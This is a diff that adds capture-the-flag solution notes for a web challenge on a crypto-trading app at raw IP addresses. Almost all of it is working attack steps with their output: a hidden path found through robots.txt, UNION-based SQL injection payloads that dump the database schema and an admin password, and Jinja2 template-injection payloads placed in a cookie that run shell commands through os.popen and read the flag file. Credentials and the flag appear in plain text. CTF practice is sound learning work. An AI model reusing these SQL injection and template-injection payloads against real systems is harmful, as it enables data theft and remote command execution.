@@ -1,0 +1,49 @@
+http://207.180.200.166:9000/login
+
+http://207.180.200.166:9000/robots.txt
+	/sup3r_secr37_@p1
+
+http://207.180.200.166:9000/sup3r_secr37_@p1
+	GraphQL
+
+Login:
+	XFT:iigvj3xMVuSI9GzXhJJWNeI
+
+SQL Injection
+	trade?coin=' UNION SELECT group_concat(sql), sql FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'-- -
+		CREATE TABLE COIN_DATA (COIN_NAME TEXT PRIMARY KEY, COIN_DESC TEXT NOT NULL),CREATE TABLE TRADERS (
+		UUID INTEGER NOT NULL, 
+		USERNAME VARCHAR(256), 
+		PRIMARY KEY (UUID)
+	),CREATE TABLE COINS (
+		UUID INTEGER NOT NULL, 
+		TITLE VARCHAR(256), 
+		BODY TEXT, 
+		PASSWORD TEXT, 
+		AUTHOR_ID INTEGER, 
+		PRIMARY KEY (UUID), 
+		FOREIGN KEY(AUTHOR_ID) REFERENCES TRADERS (UUID)
+	),CREATE TABLE ADMIN(USERNAME TEXT NOT NULL, PASSWORD TEXT NOT NULL)
+	
+	trade?coin=' UNION SELECT username,password from admin-- -
+		admin:p0To3zTQuvFDzjhO9
+
+Login:
+	http://45.134.3.200:9000/admin
+
+SSTI
+cookie:
+	name={{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
+		__pycache__
+		app.py
+		coins.db
+		flag.txt
+		note
+		requirements.txt
+		run.sh
+		sandbox
+		static
+		templates
+		wsgi.py
+	name={{config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read()}}
+		flag{u_35c@p3d_7h3_m@z3_5ucc3ssfu77y9933}
